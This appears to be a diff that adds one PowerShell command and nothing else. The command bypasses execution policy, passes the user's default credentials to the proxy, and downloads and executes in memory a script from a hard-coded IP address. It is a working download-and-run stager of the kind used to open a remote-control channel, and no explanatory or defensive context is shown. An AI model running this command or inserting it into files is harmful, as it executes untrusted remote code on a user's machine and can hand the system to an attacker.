@@ -1,0 +1,1 @@
+powershell.exe -ExecutionPolicy Bypass -nologo -noprofile -c [Net.WebRequest]::DefaultWebProxy.Credentials = [Net.CredentialCache]::DefaultCredentials; IEX ((New-Object Net.WebClient).DownloadString('http://51.132.129.219:80/connect'))
